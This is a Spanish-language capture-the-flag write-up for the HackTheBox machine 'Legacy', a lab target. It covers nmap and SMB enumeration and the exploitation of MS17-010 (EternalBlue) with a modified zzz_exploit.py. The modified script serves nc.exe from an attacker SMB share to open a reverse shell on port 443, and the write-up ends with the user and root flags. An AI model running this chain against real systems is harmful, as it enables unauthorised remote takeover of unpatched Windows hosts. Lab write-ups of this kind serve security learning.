# WriteUp HackTheBox Legacy

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Legacy_Image](Images/Legacy.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

```console
ping 10.10.10.4 -c1
```

```
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=129 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 129.193/129.193/129.193/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

```console
whichSystem.py 10.10.10.4
```

```
10.10.10.4 (ttl -> 127): Windows
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

```console
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.4 -oG nmap/allPorts
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 11:03 -04
Initiating Parallel DNS resolution of 1 host. at 11:03
Completed Parallel DNS resolution of 1 host. at 11:03, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:03
Scanning 10.10.10.4 [65535 ports]
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Completed SYN Stealth Scan at 11:03, 14.70s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.13s latency).
Scanned at 2022-08-24 11:03:43 -04 for 14s
Not shown: 65528 closed tcp ports (reset), 4 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
           Raw packets sent: 72459 (3.188MB) | Rcvd: 66193 (2.648MB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```

```console
extracPorts nmap/allPorts
```

```
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.4
   5   │     [*] Open ports: 135,139,445
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

```console
nmap -sCV -p135,139,445  10.10.10.4 -oN nmap/targeted 
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 11:04 -04
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-08-29T20:02:49+03:00
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:a2:9c (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h27m42s, deviation: 2h07m17s, median: 4d22h57m41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

Revisamos con crackmapexec el servicio smb

```console
crackmapexec smb 10.10.10.4
``` 

```
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
```

Probamos ingresar con un null session con smpmap pero vemos que no tenemos acceso

```console
smbmap -H 10.10.10.4 -u 'null'
```

```
[!] Authentication error on 10.10.10.4
```

revisamos las categorías que tiene nmap con el siguiente comando:

```console
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
```

```
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"intrusive"
"malware"
"safe"
"version"
"vuln"
```

Para ello utilizamos los siguientes scripts

```console
nmap --script "vuln and safe" -p445 10.10.10.4 -oN smbScan
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 11:42 -04
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

Dado que observamos que tiene la vulneravilidad `ms17-010` trabajamos con EternalBlue por tanto nos descargamos el siguiente repositorio

```console
git clone https://github.com/worawit/MS17-010
```

Realizamos una prueba con el checker.py de EthernalBlue y vemos que tenemos explotaciones disponibles

```console
python2 checker.py 10.10.10.4
```

```
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```

## Fase de explotación

Modificamos el archivo zzz_exploit.py 

> archivo original

```python
[...]
def smb_pwn(conn, arch):
          smbConn = conn.get_smbconnection()
  
          print('creating file c:\\pwned.txt on the target')
          tid2 = smbConn.connectTree('C$')
          fid2 = smbConn.createFile(tid2, '/pwned.txt')
          smbConn.closeFile(tid2, fid2)
          smbConn.disconnectTree(tid2)
          
          #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
          #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
          # Note: there are many methods to get shell over SMB admin session
          # a simple method to get shell (but easily to be detected by AV) is
          # executing binary generated by "msfvenom -f exe-service ..."
  
[...]
```

> archivo modificado para verificar si tenemos ejecución remota de comandos

```python
[...]
def smb_pwn(conn, arch):
          #smbConn = conn.get_smbconnection()
          #
          #print('creating file c:\\pwned.txt on the target')
          #tid2 = smbConn.connectTree('C$')
          #fid2 = smbConn.createFile(tid2, '/pwned.txt')
          #smbConn.closeFile(tid2, fid2)
          #smbConn.disconnectTree(tid2)
          
          #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
          service_exec(conn, r'cmd /c ping 10.10.14.4')                     
          # Note: there are many methods to get shell over SMB admin session
          # a simple method to get shell (but easily to be detected by AV) is
          # executing binary generated by "msfvenom -f exe-service ..."
[...]
```
Nos ponemos en escucha de los paquetes ICMP y lanzamos el exploit para ver si tenemos ejecución remota de comandos

```console
sudo tcpdump -i tun0 icmp -n
[sudo] password for mzapata: 
```

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:42:21.676328 IP 10.10.10.4 > 10.10.14.4: ICMP echo request, id 512, seq 256, length 40
12:42:21.676350 IP 10.10.14.4 > 10.10.10.4: ICMP echo reply, id 512, seq 256, length 40
12:42:22.676625 IP 10.10.10.4 > 10.10.14.4: ICMP echo request, id 512, seq 512, length 40
12:42:22.676642 IP 10.10.14.4 > 10.10.10.4: ICMP echo reply, id 512, seq 512, length 40
12:42:23.676952 IP 10.10.10.4 > 10.10.14.4: ICMP echo request, id 512, seq 768, length 40
12:42:23.676976 IP 10.10.14.4 > 10.10.10.4: ICMP echo reply, id 512, seq 768, length 40
12:42:24.676435 IP 10.10.10.4 > 10.10.14.4: ICMP echo request, id 512, seq 1024, length 40
12:42:24.676458 IP 10.10.14.4 > 10.10.10.4: ICMP echo reply, id 512, seq 1024, length 40
```

```console
python2 zzz_exploit.py 10.10.10.4 browser
```

```
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86059da8
SESSION: 0xe2399a50
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1086538
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe10865d8
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4.....
Creating service dvnY.....
Starting service dvnY.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service dvnY.....
Done
```

Nos descargamos en la máquina víctima desde nuestra máquina un nc.exe para poder conectarnos remotamente de la siguiente forma:

1. Nos descargamos el nc.exe de SecLists
2. Nos montamos un servidor samba
3. Modificamos el archivo zzz_exploits.py para solicitar un recurso de nuestramaquina
4. Nos ponemos en escucha en el puerto 443 en nuestra máquina
5. Corremos el exploit

Paso 1.

```console
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
```

Paso 2.

```console
impacket-smbserver smbFolder $(pwd)
```

```

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Paso 3

```python
[...]
def smb_pwn(conn, arch):
          #smbConn = conn.get_smbconnection()
          #
          #print('creating file c:\\pwned.txt on the target')
          #tid2 = smbConn.connectTree('C$')
          #fid2 = smbConn.createFile(tid2, '/pwned.txt')
          #smbConn.closeFile(tid2, fid2)
          #smbConn.disconnectTree(tid2)
     
          #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
          service_exec(conn, r'cmd /c \\10.10.14.4\smbFolder\nc.exe -e cmd 10.10.14.4 443'  )    
          # Note: there are many methods to get shell over SMB admin session
          # a simple method to get shell (but easily to be detected by AV) is
          # executing binary generated by "msfvenom -f exe-service ..."
```

Paso 4.

```console
sudo rlwrap nc -nlvp 443
```

```
listening on [any] 443 ...
```

Paso 5.

```console
python2 zzz_exploit.py 10.10.10.4 browser
```

```
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x863cbda8
SESSION: 0xe147b748
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1b885b0
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1b88650
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4.....
Creating service lUkW.....
Starting service lUkW.....
The NETBIOS connection with the remote host timed out.
Removing service lUkW.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

Una vez nos da acceso al sistema vemos que tenemos acceso al sistema y ademas podemos ver tanto la flag de *user* como la de *administrador*

Flag de usuario

```console
type C:\DOCUME~1\jhon\Desktop\user.txt
```

```
e69af0e4f443de7e36876fda4ec7644f
```

Flag de root

```console
type C:\DOCUME~1\Administrator\Desktop\root.txt
```

```
993442d258b0e0ec917cae9e695d5713
```

## Estructura del directorio



```
Legacy
├── content
│   └── nc.exe
├── exploits
│   └── MS17-010
│       ├── BUG.txt
│       ├── checker.py
│       ├── eternalblue_exploit7.py
│       ├── eternalblue_exploit8.py
│       ├── eternalblue_poc.py
│       ├── eternalchampion_leak.py
│       ├── eternalchampion_poc2.py
│       ├── eternalchampion_poc.py
│       ├── eternalromance_leak.py
│       ├── eternalromance_poc2.py
│       ├── eternalromance_poc.py
│       ├── eternalsynergy_leak.py
│       ├── eternalsynergy_poc.py
│       ├── infoleak_uninit.py
│       ├── mysmb.py
│       ├── mysmb.pyc
│       ├── npp_control.py
│       ├── README.md
│       ├── shellcode
│       │   ├── eternalblue_kshellcode_x64.asm
│       │   ├── eternalblue_kshellcode_x86.asm
│       │   └── eternalblue_sc_merge.py
│       └── zzz_exploit.py
├── Images
├── nmap
│   ├── allPorts
│   ├── smbScan
│   └── targeted
├── Readme.md
└── scripts
```


